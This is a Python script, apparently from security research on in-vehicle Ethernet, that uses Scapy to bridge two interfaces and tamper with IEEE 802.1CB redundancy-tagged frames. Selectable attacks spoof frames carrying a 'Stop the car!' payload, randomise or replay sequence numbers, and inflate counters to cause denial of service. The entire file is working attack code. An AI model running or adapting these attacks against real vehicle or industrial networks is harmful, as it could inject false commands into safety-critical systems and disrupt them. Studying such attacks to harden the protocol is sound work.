# Documentation: https://github.com/secdev/scapy
# More: https://scapy.readthedocs.io/en/latest/api/scapy.packet.html
# More: https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html
# More: https://scapy.readthedocs.io/en/latest/build_dissect.html
# Page 49 of the IEEE 802.1CB standard
import random
import time
import sys

from scapy.packet import Raw

from RedundancyTag import RedundancyTag
from scapy.sendrecv import bridge_and_sniff, sendp

input_interface = "eth0"
output_interface = "eth1"


def determine_attack():
    """
    This function determines the attack that will be performed.
    """
    attack = 0
    if len(sys.argv) > 1:
        try:
            attack = int(sys.argv[1])
        except ValueError:
            print("Invalid attack number. Defaulting to passive mode.")
    else:
        print("No attack number provided. Defaulting to passive mode.")

    if attack == 1:
        print("Spoof Ahead is enabled.")
        return spoof_ahead
    elif attack == 2:
        print("Spoof Behind is enabled.")
        return spoof_behind
    elif attack == 3:
        print("Tamper Random is enabled.")
        return tamper_random
    elif attack == 4:
        print("Tamper Replay is enabled.")
        return tamper_replay
    elif attack == 5:
        print("Speedup is enabled.")
        return speed_up
    else:
        print("Passive mode is enabled.")
        return passive


def passive(pkt):
    """
    This function is the passive mode.
    """
    pkt.show()
    return pkt.haslayer(RedundancyTag)


def spoof_ahead(pkt):
    """
    Use spoofing to create new packets within the network with existing
    sequence numbers that arrive earlier than the correct packets.
    """
    global output_interface
    if pkt.haslayer(RedundancyTag):
        debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
        pkt[Raw].load = debug_number + " Stop the car!"
        sendp(pkt, iface=output_interface)
        return True
    else:
        return False


def spoof_behind(pkt):
    """
    Use spoofing to create new packets within the network with existing
    sequence numbers that arrive later than the correct packets.
    """
    global output_interface
    if pkt.haslayer(RedundancyTag):
        sendp(pkt, iface=output_interface)
        debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
        pkt[Raw].load = debug_number + " Stop the car!"
        return pkt
    else:
        return False


def tamper_random(pkt):
    """Modifies existing packets to have random sequence numbers."""
    max_sequence_number = 2 ** 16  # This is dependent on the 802.1CB configuration "Sequence Length".
    if pkt.haslayer(RedundancyTag):
        pkt[RedundancyTag].sequence_number = random.randint(0, max_sequence_number)
        return pkt
    else:
        return False


replay_packet = None


def tamper_replay(pkt):
    """Modifies the sequence number to replicate packets."""
    global replay_packet, output_interface
    if pkt.haslayer(RedundancyTag):
        if "Accelerate" in pkt[Raw].load.decode("utf-8"):
            replay_packet = pkt
        else:
            if replay_packet is not None:
                pkt = replay_packet
                pkt[RedundancyTag].sequence_number += 1
        return pkt
    else:
        return False


speedup_counter = 0


def speed_up(pkt):
    """Tries to speed up the sequence counter by skipping many numbers.
    This should cause a DoS attack with only a limited number of packets."""
    global speedup_counter
    speed_multiplier = 5  # This is dependent on the 802.1CB configuration "History Length".
    if pkt.haslayer(RedundancyTag):
        speedup_counter += 1
        pkt[RedundancyTag].sequence_number += speedup_counter * speed_multiplier
        return pkt
    else:
        return False


attack_method = determine_attack()
time.sleep(1)

bridge_and_sniff(if1=input_interface, if2=output_interface, xfrm12=attack_method)
